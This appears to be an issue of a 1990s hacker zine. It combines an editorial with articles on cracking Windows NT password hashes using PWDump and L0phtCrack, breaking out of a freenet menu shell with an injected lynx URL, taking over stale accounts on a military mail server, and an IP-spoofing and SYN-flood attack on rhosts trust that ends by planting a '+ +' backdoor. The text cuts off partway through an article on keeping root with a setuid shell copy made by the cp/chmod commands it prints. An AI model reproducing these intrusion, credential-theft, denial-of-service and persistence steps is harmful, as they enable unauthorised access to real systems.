[Editorial : by Scud-O]  Expanding one's mind 
 
           This month I would like to talk to you about a topic that needs to 
be addressed. We as a species have begun to slow our development. Nature 
leaves survival to the fittest, but with today's technology, more people than 
we should have survive. This may sound great, but for a species to advance, 
we need to have this survival of the fittest. The best way i can see to 
accomplish this is by expanding one's mind. A fast mind can own a fast body 
any day. Now, by being a hacker you do show a strive to expand your mind. And 
this is good, but only 'real' hacking ( i.e. finding new holes, working to 
trace connections and data flow thru machines is real hacking to me. ) mail 
bombing, and anarchy are not hacking. they do not expand one's mind. Cookbook 
hacking is also not a method to expand your mind. By using a 'cookbook' to 
hack you are in fact shutting your mind off. You are simply following 
directions, and what serious thought is expelled on that? none. 
           Expanding your mind uses all of your senses. Expanding your mind 
expands to more than just hacking. New experiences help to increase your 
knowledge, and thus your mind. Try new things. If early cave men had not 
rubbed two wooden sticks together, would we have fire? no. And where would we 
be today if we had not discovered fire? Still in a cave. Our minds are waiting 
to be expanded. We still have 90% of our brain left to use up. If we don't 
expand ourselves, it would be an awful waste of space, would it not? So 
go on, expand yourself.

I.   WaRsPrItE's talk on NT Hacking 
----------------------------------- 
 
 
-----BEGIN PGP SIGNED MESSAGE----- 
 
        First off, I'd like to say that I think that this is an excellent 
           utility for checking the security of NT networks. However, just like 
           the now infamous and much over-hyped "SATAN" it's not the skeleton 
           key into any NT network. 
 
        As I say in every fucking article I write, the key is in the basics. 
           If users pick good passwords then they are next to impossible to 
           crack. For example, if you use upper case, lower case, and numbers 
           then there are 1.240176943466 x 10(25) possible combinations. Now add 
           some punctuation to that! Remember in NT the password can be up to 14 
           charaters as opposed to the 8 in *NIX. Just to put that that in 
           perspective, the sun will go nova in about 1.0 x 10(10) years and in 
           about 1.0 x 10(21) years until all orbits decay by gravitational 
           radiation. So needless to say my little brute force attack was futile 
           at best :). 
 
        The two programs I used in the attack were L0phtCrack and PWDUMP. I 
           must say that PWDump [by Jeremy Allison, jra@cygnus.com] works 
           beautifully. Provided you're logged in as "administrator". So why use 
           it to hack then?! Because it'll work on any copy of a registry! If 
           you can swipe some backup media from the server room that might have 
           a copy of the registry on it :). The NT I exploited and who's password 
           hashes I included in this zine, I hacked because the moron sysadmin 
           allowed Domain users to log on locally on the server. During 
           installation NT asks if you want to make emergency repair disks 
           (rdisk.exe) and the default choice is "yes". Everytime you run rdisk 
           NT stores a copy of the Registry in %SystemRoot%\Repair. And the 
           default permission of that directory is "read" for normal users. Piece 
           of cake to get a copy of the registry. The problem is, that any 
           passwords that have been changed since the the last time rdisk was 
           run won't work (minor glitch). Now that you have a copy of the 
           registry what do you do with it? Well, find an NT machine that you 
           can login as "administrator" and run PWDump.exe. In this case I 
           brown nosed some warez fags and installed it at home :). After that 
           it's pretty simple, run L0phtCrack.exe with your favorite wordlist or 
           use it in brute force mode. It took me 6 days on a Pentium 133 to get 
           three accounts. Amazingly,it got passwords that were 6 charaters long! 
           Cudos to L0pht!

II.  Info on the pwdump Utility 
------------------------------- 
 
        Windows NT Password Dump Utility 
           -------------------------------- 
 
This handy utility dumps the password database of an NT machine that 
is held in the NT registry (under 
HKEY_LOCAL_MACHINE\SECURITY\SAM\Domains\Account\Users) into a valid 
smbpasswd format file. This should be a help to Samba administrators 
who have a master password database on a Windows NT machine and need 
to keep this in sync with the smbpasswd file on their UNIX/Samba 
server. 
 
This utility dumps NT password entries in the format : 
 
<user>:<id>:<lanman pw>:<NT pw>:comment:homedir: 
 
Where <user> is the user-name on Windows NT, <id> is the Windows NT 
RID (relative ID) - the last 32 bit component of the Windows NT users 
SID, <lanman pw> is the users lanman password hash, <NT pw> is the 
users Windows NT (md4) password hash - note that if the user has no 
password these will be dumped as the string 'NO PASSWORD*****', if the 
account is disabled or invalid these are dumped as 32 '*' 
characters. The comment is a concatenation of the users full name on 
Windows NT and the description field in the Windows NT user-manager 
program. The homedir cannot contain ':' characters unfortunately, as 
these are used as field separators in the smbpasswd file (as per 
UNIX), all ':' characters after drive letters are dumped as '_' 
characters. 
 
How to use pwdump  
----------------- 
 
Only as a suggestion, I would recommend dumping your NT machines 
account database and then creating regular UNIX users (in /etc/passwd) 
with the same UNIX account numbers as their NT RID - this will make 
replicating the smbpasswd file much easier later on. These /etc/passwd 
accounts may have disabled password entries, prohibiting the NT users 
from logging onto the UNIX box via telnet (this is similar to removing 
the 'log on locally' right on an NT server). This will not prohibit 
them from using the Samba box as a server via Samba though. The 
created smbpasswd file may then be copied to the 
$SAMBA/private/smbpasswd file (where $SAMBA is the base directory you 
installed Samba into). If Samba is set up for user level security and 
encrypted passwords (set : 
 
security = user encrypted passwords = yes 
 
in your smb.conf file) then Windows NT / 95 users who have logged on 
to the NT domain will be able to transparently access the resources on 
the Samba box as their correct UNIX user id's (the ones you originally 
created). You can then set up a 'AT' job on your NT server to 
periodically dump your NT password database into a new smbpasswd file 
and copy it over (securely somehow) to the Samba server to keep the 
password databases on the two machines in sync. 
 
The pwdump.exe utility can take a \\machine name as argument, it will 
then proceed to dump the password database from that machine instead 
of the local machine, if it has sufficient privillages to do so. By 
default it will dump the password database of the local machine. 
 
NOTE: The passwords dumped by this utility are 'plain-text equivalent' 
in the CIFS protocol and *MUST* be protected. The UNIX security on the 
smbpasswd file *MUST* be set to (owner root, permissions rw------- - 
ie. read/write owner, no access to anyone else). 
 
 
Future Enhancements  
------------------- 
 
As this code decrypts the obfuscication step in the NT password 
database it may be reversed, allowing a lanman and md4 hash to be 
written into the NT registry for a user account. This would allow a 
UNIX/Samba box to be the master repository for user account details, 
and the account passwords to be replicated and 'brute forced' into the 
NT password database, bypassing the rather baroque NT API mechanisms. 
 
This code doesn't attempt to do this however, this is left as an 
'exercise to the reader' (or an enterprising university somewhere :-). 
 
 
How it works  
------------ 
 
This utility takes great pains to maintain NT security as it wanders 
through the NT SAM areas of the registry. It will not even run is you 
are not running as Administrator. Firstly it goes through and adds the 
'minimum necessary change' (see Asimov's 'the End of Eternity' :-) to 
allow the program to read the password entries. It dumps the users 
entries (see the code for details) and then goes back through the 
registry restoring the security on all the keys it touched. I have 
tested this code on NT Server/Workstation 4.0 and NT 3.51 and have 
never had problems, but as always, this code has *NO GUARANTEE* 
associated. 
 
Source code  
----------- 
 
The source code for this utility may be found in  
 
ftp://samba.anu.edu.au/pub/samba/pwdump/pwdump.c 
 
Note that this code needs a DES library to compile. The one I used in 
development is Eric Young's excellent DES library found at : 
 
ftp://ftp.psy.uq.oz.au/pub/Crypto/DES/libdes-4.01.tar.gz 
 
which compiles fine under Windows NT. I used Microsoft Visual C++ 4.x 
as the compile environment. The code pwdump.exe is provided for people 
who do not have a compiler and is a binary of the program for x86 NT 
machines (are there any other kind :-).

The best way to build this library is to build it as part of SSLeay. 
 
This kit builds a DES encryption library and a DES encryption program. 
It supports ecb, cbc, ofb, cfb, triple ecb, triple cbc, triple ofb, 
triple cfb, desx, and MIT's pcbc encryption modes and also has a fast 
implementation of crypt(3). 
It contains support routines to read keys from a terminal, 
generate a random key, generate a key from an arbitrary length string, 
read/write encrypted data from/to a file descriptor. 
 
The implementation was written so as to conform with the manual entry 
for the des_crypt(3) library routines from MIT's project Athena. 
 
destest should be run after compilation to test the des routines. 
rpw should be run after compilation to test the read password routines. 
The des program is a replacement for the sun des command.  I believe it 
conforms to the sun version. 
 
The Imakefile is setup for use in the kerberos distribution. 
 
These routines are best compiled with gcc or any other good 
optimising compiler. 
Just turn you optimiser up to the highest settings and run destest 
after the build to make sure everything works. 
 
I believe these routines are close to the fastest and most portable DES 
routines that use small lookup tables (4.5k) that are publicly available. 
The fcrypt routine is faster than ufc's fcrypt (when compiling with 
gcc2 -O2) on the sparc 2 (1410 vs 1270) but is not so good on other machines 
(on a sun3/260 168 vs 336).  It is a function of CPU on chip cache size. 
[ 10-Jan-97 and a function of an incorrect speed testing program in 
  ufc which gave much better test figures that reality ]. 
 
It is worth noting that on sparc and Alpha CPUs, performance of the DES 
library can vary by upto %10 due to the positioning of files after application 
linkage.

Intro: 
   
  This tool, as with many others, can be used for breaking into systems 
  in illegal fashions - THAT IS NOT WHAT IT IS INTENDED FOR! We had a 
  working version done the same day that PWDump was released in order 
  to audit some of our internal networks. However, as we started 
  researching more into it we noticed many shortcomings in how MS 
  security is handled and present some of these in our tool. We take 
  no responsibility for misuse of this information. It is our belief 
  that the only way to protect yourself is to fully understand your 
  vulnerabilities. Unfortunately, for some of these problems we still 
  don't see immediate solutions. Our particular solution has been to 
  trust our users, and not let any of our NT machines talk to the internet 
  (ie filtered very tightly at the perimiter). We are interested in 
  other solutions. 
   
Overview: 
 
  Recently several NT password crackers have emerged. We offer this 
  one with the belief that it offers some features and functionality 
  that the current ones do not have. 
 
  L0phtcrack will recover passwords from Windows NT registries in a  
  variety of fashions.  
 
  By feeding in the output from PWDump [by Jeremy Allison, jra@cygnus.com]  
  and a dictionary file, L0phtcrack rev 1 will attempt to retrieve:  
 
    1) only the LANMAN plaintext password 
    2) only the NT Dialect MD4 plaintext password [see reasoning below] 
    3) Both the LANMAN and MD4 plaintext passwords (by deriving the 
          MD4 password from the LANMAN output and running through up to 
          2 to the Nth power permutations) 
 
  Alternatively, L0phtcrack gives you the capability to _brute force_ the 
  entire key space and recover ALL USER PASSWORDS up to 14 characters in  
  length.  
 
  By going through the entire keyspace available, this program 
  WILL RETURN ALL OF THE PLAINTEXT PASSWORDS (both LANMAN and MD4) up to 
  and including 14 characters in length (note that the User Login Dialog 
  box on NT machines limits the amount of characters that can be typed 
  to 14 for the MD4 dialect. Future releases of this software will enable 
  brute forcing of up to 16 characters for MD4). 
 
  L0phtcrack comes in three flavours: 
 
    1) A nice Windows GUI interface so you can point and click. 
    2) A CLI version for running in "DOS" windows. 
    3) Source code that is generic enough to build on most Un*x's. 
 
Description: 
 
  Here's how it works - 
 
  For NT, LANMAN passwords are derived in the following fashion: 
 
    . The user password is converted to UPPERCASE 
    . If the user password is less than 14 bytes, the password is padded  
         with NULL characters to 14 bytes. 
    . If the user password is greater than 14 bytes, the password is 
         truncated to 14 bytes. 
    . The 14 byte string is split down the middle into two 7 byte strings. 
    . One 8 byte odd parity des key is derived from each of the 7byte 
         strings [note1].  
    . The constant 'magic value' [note2] is then encrypted first  
         with the first odd parity des key and then with the second. The results 
         are concatenated. This is the LANMAN OWP [note3]. 
 
    [note1: There is a significant loss of bits in the str_to_key functions 
        which derive the 8 byte odd parity DES keys from the 7 byte strings. 
        This knocks down the possibly key space to attack DES substantially. 
        Thanks to Hobbit@avian.org for pointing this out to us] 
 
    [note2: the constant 'magic value' is derived from the encryption 
        of 0x4B47532140232425 with a key of all 1's ] 
 
    [note3: quickly scanning the LANMAN OWP's it is easy to see who has 
        passwords that are 7 characters or less. If the second half of the 
        LANMAN OWP is 0xAAD3B435B51404EE the value for the last seven characters 
        in the user password were all NULLs.] 
 
  For NT, NT Dialect MD4 passwords are derived in the following fashion: 
 
    . The users password is converted to Unicode [note4]. 
    . The unicode password is run through MD4 to return a 16 byte value. 
         This is the MD4 OWP [note5] [note6]. 
 
    [note4: There is a large amount of confusion as to where Unicode stops. 
        i.e. is "ABC", which is in actuallity 'A','B','C','\0', encoded 
        as 'A' '\0' 'B' '\0' 'C' '\0' or 'A' '\0' 'B' '\0' 'C' '\0' '\0' '\0'. 
        We find that in this situation the former is the case. 
 
    [note5: You might say "why do you even bother having an option of doing 
        _only md4_ when it is much quicker to derive it from the LANMAN 
        password". To which we would reply "this gives us the ability to 
        easilly roll in the ability to dictionary attack traffic that we 
        see on the network. This will be particularly important if the 
        proposed changes to the CIFS spec go into place. See our S/Key 
        cracker MONKEY for more of an idea on what's to come".] 
 
    [note6: For those who were building md4 crypt-n-compare engines from 
        inside Microsoft's Visual C++ IDE. The VC++ does not by default 
        define _MSDOS_, or 8086 which are necesarry to through the byte 
        ordering into the correct mode in md4.c] 
 
  What we do in rev 1 - 
 
    In rev 1 of l0phtcrack the user must hand in a password file 
    in the format of Jeremy Allison's PWDump output. From this 
    the following actions can be taken. 
 
    LANMAN only -  
         A dictionary is fed in and each word is encrypted using the 
         LANMAN one round DES format as described above. The list of 
         users is checked against this encrypted OWP. Any that are  
         found matching are flagged. 
 
    MD4 only - 
         A dictionary is fed in and each word is encrypted using 
         md4. The list of users is checked against this encrypted OWP. 
         Any that are found matching are flagged. See the description 
         of rev 2 for why this option is important. 
 
    LANMAN and md4 - 
         A dictionary is fed in and each user is first checked against 
         the LANMAN one round DES OWP. If a match is found, the word 
         is run through 2 to the power of strlen(word) case permutations  
         in md4 to return the case sensitive md4 value. 
 
    Brute force - 
         An input string containing the list of valid characters is  
         run through sequentially in all possible combinations up to 
         7 characters in length. The first half and second half of the 
         LANMAN password are compared against these, thus returning 
         all passwords up to 14 characters in total length. Since the 
         logon screen will not allow you to enter more than 14 characters 
         ,even though the NT MD4 dialect will allow up to 128, this 
         should return all users passwords. When a match is found 
         the word is run through 2 to the power of strlen(word). 
   
         By changing the default string that is processed through you 
         can drastically change the amount of time it takes to brute 
         through the entire keyspace. Keep in mind that the following 
         characters are not valid in passwords so they don't need to 
         be included: '/', '\', '[', ']', ':', ';', '|,' ,'=', ',',  
         '+', '*', '?', '<', '>' [according to the MS technet information]. 
         For example: if you just want to check all combinations of letters 
         all you have to run through is ABCDEFGHIJKLMNOPQRSTUVWXYZ. 
   
         rev 2 will have this optimized a bit more, in addition to allowing 
         a remote querry to our tables of precomputed hashes, thus reducing 
         the problem to that of a table lookup. 
 
  Why is it important to be able to attack md4 only? That is much 
  slower! 
          
         The changes being made to the CIFS spec imply that in the future 
         a server will be able to force a client to use the NT dialect  
         and not negotiate down. Based upon how the "key exchange" is 
         done this will be attackable via the hooks put in for md4 only 
         much in a similar way that our program "MONKEY" will attack 
         s/key sessions based upon promiscuously viewed network traffic. 
 
  errata in rev 1 - 
          
         Several of the routines need to be optimized a bit more but the 
         tool is quite usable and quite fast as it is (100 users and an 
         an 8 meg dictionary file took under 1 minute on a PPRo 200 
         with the GUI version. The CLI is slightly faster - the bruting  
         with a string of "ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789-_"  
         took a little over 3 days on a P133). 
 
         There are hooks to preen through the user list and instantly kick 
         out whether a user has a password of 7 characters or less, or 
         if a users password is greater than 7 chars. 
 
         If you specify md4 only it just does a straight dictionary  
         crypt and compare, if you specify any other method that returns 
         md4 values it runs through all case possibilities.  
 
         The brute forcer is not implemented in the windows GUI version. Use 
         the command line version for this functionality. 
 
  What you can expect to see in rev 2 - 
 
    . The functionality of PWDump will be included in the l0phtcrack 
         program so you won't need to run seperate programs. 
 
    . You should be able to pull down registries from remote / local 
         machines WITHOUT BEING ADMINISTRATOR and WITHOUT NEEDING TO 
         KNOW THE ADMINISTRATOR's PASSWORD [read this bullet item again!!!] 
         - we believe we are very close to being able to do this now. 
 
    . You will be able to brute force the NT Dialect password up to 
         16 characters in length for those tricky network users that 
         never log in via the console. 
 
    . The windows GUI will be multi-threaded to take advantage of  
         multiple processors for dramatically improved brute forcing. 
  
    . We should have pre-computed tables of the entire key-space  
         available so all that needs to be done is a remote table look 
         up.

Breaking out of Freenet Menu Shell 
compiled by N-TREEG 
Source and credit goes to:  CERT & General Protection Fault 
 
Freenet's are great becuase of the operative word _FREE_.  But most have 
extremely restrictive menu  shells and for the most part, they won't give you 
access to your favorite bourne (bash, csh) shell or  whatnot.  That really 
sucks.  Do they not trust us with a fully functional interactive shell?  ;-) 
Well I know that another online zine has published info on how to get to a 
bourne shell through pine.  That took a  good bit of work to set up and get 
going correctly.  I think this method is a lot easier.  All you need is  
access to lynx.  (Being able to cut and paste helps too if you're as 
lazy as I am.) 
Here's how: 
 
Start up lynx.   
 
Hit g  (for go to). 
 
Enter this into the "URL to open:" field 
LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/nul 
 
When it says "Enter a filename:" enter this 
 /dev/null 
 
When it returns "File exists. Overwrite? (y/n)"  hit y 
 
You should hopefully see a beautiful little $ now.  There's your local 
shell.  Have fun.  Aren't freenet's grand?  ;-)

How to hack military e-mail servers....WaRsPrItE 
 
 
-----BEGIN PGP SIGNED MESSAGE----- 
 
        Are our military networks safer than their civilian counter parts? 
Most military bases, if not all military bases, have a some sort UNIX server 
to route non-classified email. Usually, the machine is identified as 
emh(electronic mail host).<basename>.<branch>.mil. It is extremely easy for 
military members to get an account on one of these servers, simply call up 
and request one. As we all know, military members quite often get orders to 
other installations, especially those personnel stationed overseas. Due to 
this fact, electronic mail hosts quite often have huge password files and 
many of the accounts contained in that file are for users that "shipped out" 
long ago and never had their account removed from the system. A friend of 
mine exploited this one night when we discovered the fact that the server 
also had it's security set so that every 6 months a new password containing 
numbers or punctuation was required. The problem was that the system didn't 
prompt you for your old password before requesting a new one. We tried 
connecting to the system via Telnet on a hacked account from a generic ISP 
with no luck. The good news was that we were overseas and overseas bases 
have phone systems that are independant of the host nations' system. Meaning 
there had to be a number to dial to get connected to the base's phone system 
if you happened to be off the base. This number is realitively easy to get 
just call the local base operator and ask for it. The kicker was that the 
local dumbass jarhead Marine base was still running with X-Bar switching not 
ESS like us. So here's what we did.... 
 
<Our Base> -> <Jarhead's dial up> -> <Our Dial Up> -> <Mail Host modem> 
 
After that, it was simple, we dialed in with a socially engineered legit 
account and went to /etc and did a cat of passwd (NOT SHADOW!)and logged it 
locally. After gaining a listing of accounts on the system we logged off. 
After that, we just simply tried every login until we found one that was 
overdue for a passwd change. We then set a password for it and made a note of 
the account. If we wanted to pursue it further we could have done a finger on 
the account to see which,if any, other servers the individual had accounts on 
since the military uses the standard of, <first seven charaters of your last 
name + first initial> to determine logins. I'm not offering this story as an 
example of my k-rad 3l33t3 skillz. Just to show that simple exploits often 
work the best. `Nuff said!

                                  God This is going to take a while! 
 
           This article includes all the goodies, and in complete detail tells 
how to literally hack a server, using IP Spoofing, one of the most mis 
understood terms in the underground. Stupid fuckers have been using IP 
spoofing to go on irc and brag to their friends that they are k-rad. This 
is not why ip spoofing came around, in this text I will explain to you, in 
easy to understand language, that ip spoofing is just a step into the  
process of gaining access to a server you are not supposed to have access 
to.  
 
The Basics 
---------- 
In order to further understand what I am about to explain you must have a  
general knowledge of several things that I will explain in the following 
paragraphs...So no need to start to pout yet ;) 
 
Three way Handshakes 
-------------------- 
           In order to start an actual data transfer of any kind on a network 
you must have what you call a "three way handshake" it goes much like this. 
You send what is called a SYN packet to a host, the SYN Packet has headers 
which in turn tell the host that you want to connect to him, the host send 
you back an ACK command, which tells you that its alive, and open for  
connections, then you again send out an ACK Command to the host telling it 
that your still alive, and the data transfer can begin. If that's a little 
confusing, I agree, its confusing in words, but let me make a small diagram 
on what a three way handshake looks like : 
 
                                         YOU --SYN-----> HOST 
(You send out a SYN Packet to the host, telling it you want to connect) 
                                         YOU <--ACK----- HOST 
(Host responds with an ACK or acknowledgment that it is alive and open) 
                                         YOU -----ACK--> HOST 
(You respond back and the data transfer can now begin..) 
 
           Every time you do a regular data transfer on the internet such as 
bring up a webpage this three way handshake commences. So now you know how 
data gets from that machine to yours, this little information is the basis 
of this attack. 
 
 
.rhosts and trusted servers 
--------------------------- 
           Aright lets say you have in internet account, with a local Internet 
service provider (ISP), AND you have an account with another server, which 
gives you a shell account. A shell account is basically an account on the  
servers UNIX operating system. They give you a home directory in which you 
have access to the text editors such as Joe, and Pico, and you can also  
work on c programs using the gcc compiler.  
           O.K. now lets say you want to save some time, so you want to make 
the process of logging in to the shell account shorter, or maybe eliminate it 
completely. Well due to the trust that a UNIX operating system has with its 
users, this can be done, the process of entering a password at the login  
screen can be illiminated. This can be done with a file called .rhosts, which 
will grant or deny access based off the IP address of the person trying to  
logon to the shell account its self. 
           The server that is in the .rhosts file is called the trusted server 
for the fact that when it sees that IP address it trusts them. It thinks 
that they are the person that is supposed, and allowed to be there. UNIX  
will trust ANYONE with the specified ip address in the .rhosts file.  
 
SYN Flooding 
------------ 
           A port on most UNIX operating systems can only handle a certain  
number of connections to one port at a time, this is called the "backlog". If  
the backlog is filled up all incoming SYN connections will be ignored.  
Leaving them not allowed to connect to the server until the other  
connecting requests are dealt with properly.  
           But if the SYN headers are spoofed when sent to the host the host 
will keep on trying to successfully find the person who sent the original  
syn message to it, and wont let anyone connect until it is done. Here's the 
step of a SYN Flood 
1) Person uses ip spoofer to spoof his original ip address and sends out a 
several SYN packet to a specified port at a host. 
2) The host's port gets flooded with SYN's and try's to reply to the SYN  
command but cant because the person who sent the original SYN is not a 
real host, leaving the ports closed, so no other connections can be made into 
that host. 
 
  YOU (Spoofed IP) --SYN-----> HOST |  
  YOU (Spoofed IP) --SYN-----> HOST |  
  YOU (Spoofed IP) --SYN-----> HOST |  
  YOU (Spoofed IP) --SYN-----> HOST | From here on all other connections 
  YOU (Spoofed IP) --SYN-----> HOST | Will be ignored because all the  
  YOU (Spoofed IP) --SYN-----> HOST | connections are taken 
  YOU (Spoofed IP) --SYN-----> HOST | 
   X (Not really real) <--ACK-- HOST| 
 
So in turn the HOST cannot find YOU (With the spoofed IP) so the port is left 
flooded because the host will not drop the connections until they are fur 
filled. After a bit the server will crash.. This is called a "Denial of  
service attack" For the fact that it denies anyone else service to that host 
you can read more about denial of service in this newsletter. 
 
Sequence Numbers? 
----------------- 
           Sequence Numbers are a prime factor in this attack, but also kinda 
hard to explain. I only have a general knowledge of sequence numbers, but a 
general knowledge is a hell of alot better then no knowledge ;) Every byte  
that you transfer from one computer to another on a Internet network it is  
assigned a sequence number. Sequence Numbers are assigned to make sure that 
the connection that is made doesn't become corrupt.  
           Lets say we didn't have sequence numbers, then maybe by accident we 
got a repeat of a byte, that would corrupt our data right there.  
           IN a three way handshake, the first sent SYN packet contains what is 
called the Initial Sequence number, that sequence number tells the host what 
the next sequence number is. (Confused yet) This will all come together when 
I explain the attack at itself, its all got to do with timing and round 
trip time.  
           Round trip time is how long it takes your SYN packet to reach the 
host and the host to send back its ACK (acknowledgment) lets say you had to 
do this all by hand, you send out the SYN command, and the host sends  back 
the ACK command, you have to calculate the exact sequence numbers timing 
in order to send the ACK back to the host to start the data transfer. 
           -If the sequence number you send is a smaller number then what  
            the server expects it will just throw that try off, because it 
            thinks its an old packet that never reached or has failed before 
           -If the sequence number is exactly what the host expected, it will 
            let the ACK come through and the data transfer can begin. 
           -If the sequence number you send is greater then what the host 
            expects it will hold that sequence number, because it think that 
            it is a future bit, and it will hold it until the other bits 
            come through first.. 
Trust me this may all sound stupid now when I'm explaining it, but it all  
does come together when I start explaining the attack, you need to be able 
to spoof the ACK command that goes to the host when doing the 3 way handshake 
 
           Oh and each time a connection is made to the host that you are making 
the connection to the sequence numbers goes up 64,000. The Incicial sequence 
number goes up 128,000 every one second, and wraps every 9.32 hours. This 
counting process will be needed later on in the attack.. 
 
The Attack 
---------- 
           I really cant express enough how much you need to understand the above 
features before going and trying to execute this attack, just for the fact 
that you will not be successful in your attempt, it took me 3 good days of 
reading to readily understand sequence numbers, and I suggest you also read 
all you can on sequence numbers, do searches, read internet protocol articles 
just make sure you understand what you are doing before you get your hopes 
up to find out that you didn't calculate the Round trip time right and you 
end up with a smaller sequence number then originally intended. Its a bummer 
and a waste of time if you don't understand it.  
 
Short Explanation 
----------------- 
1)Choose the target 
2)Find trusted host 
3)SYN Flood trusted host 
4)Spoof the trusted host 
5)Guess the sequence numbers for the outgoing ACK 
6)Make the connection 
7)Leave a backdoor in the .rhosts file 
 
Finding a Target 
---------------- 
           This should be fairly easy based on the fact that if your the kind  
of person who has a personal vendetta with a server or you just want to try 
this out on. Or you can get special permission from 2 hosts that will allow 
you to do this as a security measure, that is probably the best way to go to 
avoid any sorts of criminal prosecutions. I urge you to not in any way  
incriminate yourself, this text is for security reasons only to inform, and 
protect. This attack is NOT new, I did not make up this attack, I'm only  
explaining it, and how to prevent it. So don't come crying to me when you get 
raided and you have no where else to go. Stay safe and be paranoid.  
 
Finding a targets Trusted Host 
------------------------------ 
           Once you have your target, you want to find out if it has a trusted  
host, since you cant go into their computer and look to see if they even have 
an .rhosts file you have to do the checking out yourself. If the target host  
does not have a trusted host, this whole text is very pointless, but from 
here on in, I am talking as if the target host does in fact have a trusted  
host. 
 
           This is where you use your talent of social engineering. Finding the 
trusted host is hard, Ill admit that, but if your going to go this far you  
might as well find out about the system your going to hack, know what your  
doing, know the system before you go in. Here is a list of possible ways  
to maybe gain information about trusted hosts. 
 
           showmout -e target ->SHows where the file systems are exported 
           finger -l @target 
           finger -l @trustedserver.com 
           finger -l root@trustedserver.com 
           rpcinfo -p x-terminal 
 
           These are a couple of ways off the top of my head, but you can always 
find shit out, Basically use your head in this matter, because well, this isn't 
the hardest part of the attack, it may seem that way now, but it only gets 
harder from here on out. Talk to a representative of the company, I dunno  
read up on social engineering... 
           Over all this attack all comes down to trusted hosts, which are 
inserted into the .rhosts file itself, this is why I spent a some time  
explaining .rhosts files, because if you can become the trusted host you  
also have access to the target host. Is this getting better by the minute or 
what? 
 
SYN Flood trusted host 
---------------------- 
           In order for this whole thing to go through the trusted host must be 
taken out with a SYN flood (SYN Flood was discussed earlier in this article) 
for the fact in later parts of this attack you need to spoof as the trusted  
host then send out a SYN command to the target host's port to try to connect 
to it, and if the host your attacking can send a message back to the trusted 
host, it would get an error saying that host did not send out a SYN packet  
for an opening connection, so in turn to make sure that does not happen. You  
must flood the ports of the trusted host so no other connections can be made. 
         
        *NOTE* This is because you are flooding ports on the trusted host 
                  and when the port in the trusted host is still looking for  
                  someone to send back an ACK (It is still gagged by the SYN flood) 
                  command to it doesn't let any other connections come through. So  
                  you can successfully guess their sequence numbers that you guess 
                  (IN time) that the trusted host would send to the target host. 
            
           SYN flooding software is readily available at many "Underground" sites 
and I wont go into posting the code here for the fact I'm just wasting space 
when you can do a search on the internet yourself and find it. For example a 
very good spoofer/SYN flooder can be found at http://main.succeed.net/~coder. 
But this NEEDS to be done, you don't need any interruption's in this attack.  
 
Sample the sequence numbers 
--------------------------- 
        Because you are not the real host you are mearly a spoofed version of 
the trusted host, you also have to spoof the return sequence number. Remember 
in the three hand shake there is first a SYN from you, that tells the host 
that you want a connection to its server, then the host sends back an ACK  
or acknowledgment.  
        So if you spoof the trusted server and send out a SYN packet, the 
server you just sent the SYN packet to will try to reply back. If you don't 
guess the right sequence numbers (OR the timing of the transfer) it wont 
let you log in. See if the REAL trusted host was available (Not under a SYN 
flood) the real trusted host would have given the other host an error. But  
with the SYN flood gumming up the works, and not allowing any other  
connections, you can successfully spoof back the ACK back to the host so 
you can connect. 
        Before you do the initial attack connect to one of the major ports 
on the server your going to attack, like port 25 (The sendmail port) and 
sample its sequence numbers. You need to calculate how long it takes for  
Your SYN reaches the server and an SYN/ACK is sent back to you, then the  
ACK you send back to the host, all in one. Do this many times until you have 
enough you feel is a good diagram to round up and become a one figure.  
Remember sequence numbers go up 128,000 a second, and 64,000 per connect. 
 
           -If the sequence number you send is a smaller number then what  
            the server expects it will just throw that try off, because it 
            thinks its an old packet that never reached or has failed before 
           -If the sequence number is exactly what the host expected, it will 
            let the ACK come through and the data transfer can begin. 
           -If the sequence number you send is greater then what the host 
            expects it will hold that sequence number, because it think that 
            it is a future bit, and it will hold it until the other bits 
            come through first.. 
 
 
 
Spoof the trusted host 
---------------------- 
        This is easy there are many ip spoofer software for linux and the  
unix flavors, just pick one of these up and compile it. *NOTE* You must have 
root on the linux operating system you are doing the attack from for the fact 
that if you just have a regular home directory you cannot open up raw  
connections in which are needed for a general spoof.  
 
        So load it up and spoof the address of the TRUSTED host, and go right 
on to the next part. 
 
The heart of the attack 
----------------------- 
        This is the main part of the attack, once you are spoofed as the  
trusted host, you should send a connection request to port 513 (The login  
port) Then the host will then send back a SYN/ACK to the trusted host, which 
is under the gagging of the SYN Flood so it wont accept anymore connections 
hence it wont get an error back. While this is all going on we have to wait 
for a bit for the SYN/ACK to be sent to the host. Now you must send an ACK  
back to the host you are attacking with your guessed Sequence number attached 
(Plus one because we are sending for a login) If your guess is correct it  
will then accept your connection. 
        Type the magical word root and since that .rhosts file is there, and 
you are spoofed as the trusted host, you will get automatic access to the 
system. Isn't unix great? Trust is a great thing to encounter in any type 
of linux operating system. 
 
Once inside.. 
------------- 
Since you really don't need to edit or destroy any log files, you are home  
free, but as one last thing we do, we will put in a backdoor so we can 
access their system as we please (No more of this spoofin shit) so we do a 
cat + + >> ~/.rhosts . When you add a + + (as explained earlier) its basically 
saying any host is allowed without entering a password. The only problem 
with that alot of systems now adays are equipped with a program that looks 
for .rhosts files that have a + + file..But oh well fuck it, your in it just 
for the hack of it right?  
 
Conclusion paragraph 
-------------------- 
        Basically this attack is very useful if you know what you are doing.  
This wasn't as 'in depth' as I would have liked to go, but well, I'm not the  
kind of person who can splash what's all in my head onto a piece of paper, its 
easier for me to consume information then give it away. But I tried my best 
and I hope you could understand it.  
        Id like to give a couple shoutouts to the people who made this  
article happen. Phrack, Modify for teaching me the art of spell check, and 
the whole 0 cr3w. Remember before asking a question, always try to answer it 
yourself first.

One method to keep root...............WaRsPrItE 
 
 
-----BEGIN PGP SIGNED MESSAGE----- 
 
        First off, this is NOT a true hack since it requires that you have 
root access to begin with. I'm including it only as a way to keep root once 
you find it. I mean c`mon, how hard is it to write a simple script or batch 
job to do a "who -a | grep root" every five minutes and log the output to a 
file at $home/.root and tail it to an xterm window? Sooner or later root will 
forget to log off! I've only managed to get this to work on a few *NIX 
systems and Solaris 2.4.1 and higher has fixed this hole. But those assholes 
at Santa Cruz Operations ...... *evil grin* 
 
# cp /bin/sh $home/.root_shell 
# chmod 4111 $home/.root_shell 
 
These commands create a SUID root version of the Bourne shell ("stickey bit") 
in the home directory of the user. I personally use a file name with a "." 
just to keep prying eyes out. You can optionally use commands like "chmod g+s" 
to execute a file as the GUID of the file. Assuming of course you have access 
as the approiate group to begin with. Which is easy `cause people always 
